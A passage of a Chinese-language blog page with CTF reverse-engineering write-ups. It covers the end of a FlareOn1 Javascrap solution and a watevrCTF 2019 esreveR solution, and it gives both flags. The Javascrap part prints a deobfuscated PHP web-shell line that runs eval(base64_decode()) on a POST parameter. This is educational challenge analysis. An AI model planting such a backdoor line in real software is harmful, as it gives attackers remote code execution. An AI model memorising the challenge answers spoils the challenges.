style="color:#ae81ff">\\</span><span style="color:#e6db74">110</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">68</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">79</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">84</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">99</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6D&#34;</span>])) { <span style="color:#66d9ef">eval</span>(<span style="color:#a6e22e">base64_decode</span>($_POST[<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">49</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x31</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">68</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x4F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x54</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">116</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">104</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x61</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">116</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x44</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">79</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x54</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">106</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">118</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">97</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">53</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x63</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">114</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x61</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x70</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">65</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">84</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">102</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6C</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x61</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">114</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">101</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x44</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">65</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x53</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">72</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">111</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6E</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x44</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x4F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">84</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">99</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6F</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x6D&#34;</span>])); }

</code></pre></div><p>POST请求是什么不太清楚，但看到这些字符好像都在可见字符范围内，所以直接转成string，得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a11DOTthatDOTjava5crapATflareDASHonDOTcom&#39;</span>
</code></pre></div><p>把 <code>DOT</code>，<code>AT</code>，<code>DASH</code> 都转成对应的符号，就拿到flag了</p>
<h2 id="watevrctf-2019esrever">[watevrCTF 2019]esreveR</h2>
<p>用ida打开后，发现大量与输入无关的计算，于是决定先静态跟踪一下输入，然后再动调看过程数据</p>
<p>和输入有关的大概是这些（动调后写的wp，所以基地址改变了）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    fgets(s, n[<span style="color:#ae81ff">0</span>], stdin);
    v8 <span style="color:#f92672">=</span> sub_5578E4A20943(n[<span style="color:#ae81ff">0</span>]);
    <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)n <span style="color:#f92672">=</span> sub_5578E4A20996(v14);
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)n <span style="color:#f92672">!=</span> v8 )
    {
      v11 <span style="color:#f92672">=</span> sub_5578E4A209E9(<span style="color:#ae81ff">4521</span>);
      <span style="color:#66d9ef">if</span> ( s <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v11 )
      {
        v4 <span style="color:#f92672">=</span> sub_5578E4A212D8((<span style="color:#66d9ef">__int64</span>)s, v15, v10, v9, v11, v13);
        <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> v15 <span style="color:#f92672">*</span> ((v12 <span style="color:#f92672">^</span> v13) <span style="color:#f92672">-</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)n) )
          puts(<span style="color:#e6db74">&#34;Congratulations! You reversed the reversed reverse!&#34;</span>);
      }
    }
</code></pre></div><p>发现输入只要输入的地址不等于一个数，然后通过某个判断就行，于是再进到判断前的函数</p>
<p>会看到一个输入参数很多的函数，进去看一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  v58 <span style="color:#f92672">=</span> a1 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>a57;
  <span style="color:#66d9ef">if</span> ( a2 <span style="color:#f92672">!=</span> a57[<span style="color:#ae81ff">1</span>] )
    v58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> ( a3 <span style="color:#f92672">!=</span> a57[<span style="color:#ae81ff">2</span>] )
    v58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> ( a4 <span style="color:#f92672">!=</span> a57[<span style="color:#ae81ff">3</span>] )
    v58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> ( a5 <span style="color:#f92672">!=</span> a57[<span style="color:#ae81ff">4</span>] )
    v58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
<span style="color:#75715e">// 以下省略
</span></code></pre></div><p>输入了57个参数，而且就是判断是否相同的，相同就返回1，否则返回0</p>
<p>于是猜测这里就是最终的验证函数</p>
<p>中间经过了一系列动调，确定其它的过程没什么影响，于是在进入函数前下个断点，然后直接去rsp的地址里找比较的数据</p>
<p>最后的内存数据</p>
<pre tabindex="0"><code>[stack]:00007FFF9B4402F0 dq '{', 'e', 's', 'r', 'e', 'v', 'e', 'r', '_', 'r', 'e', 'v', 'e', 'r', 's', 'e'
[stack]:00007FFF9B4402F0 dq 'd', '_', 'y', 'o', 'u', 't', 'u', 'b', 'e', '.', 'c', 'o', 'm', '/', 'w', 'a'
[stack]:00007FFF9B4402F0 dq 't', 'c', 'h', '?', 'v', '=', 'I', '8', 'i', 'j', 'b', '4', 'Z', 'e', 'e', '5'
[stack]:00007FFF9B4402F0 dq 'E', '}'
</code></pre><p>连接起来就是flag了</p>
<pre tabindex="0"><code>{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}
</code></pre>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/reverse/">Reverse</a>
        
            <a href="/tags/buuoj/">BUUOJ</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="">
    <a href="/post/buuoj-re0-flareon-challenge/">
        
        

        <div class="article-details">
            <h2 class="article-title">BUUOJ RE (0) - FlareOn Challenge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/gwctf2019-re3-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">GWCTF2019 re3 writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/wustctf2020-re-writeups/">
        
        

        <div class="article-details">
            <h2 class="article-title">WUSTCTF2020 re writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/mrctf2020-reverse-writeups/mrctf2020-reverse-writeups/">
        
        

        <div class="article-details">
            <h2 class="article-title">MRCTF2020 reverse writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/guetctf2019-reverse-writeups/">
        
        

        <div class="article-details">
            <h2 class="article-title">GUETCTF2019 re writeups</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2021 s0uthwood&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#npuctf2020basicasm">[NPUCTF2020]BasicASM</a></li>
    <li><a href="#watevrctf-2019repyc">[watevrCTF 2019]Repyc</a></li>
    <li><a href="#flareon1javascrap">[FlareOn1]Javascrap</a></li>
    <li><a href="#watevrctf-2019esrever">[watevrCTF 2019]esreveR</a></li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
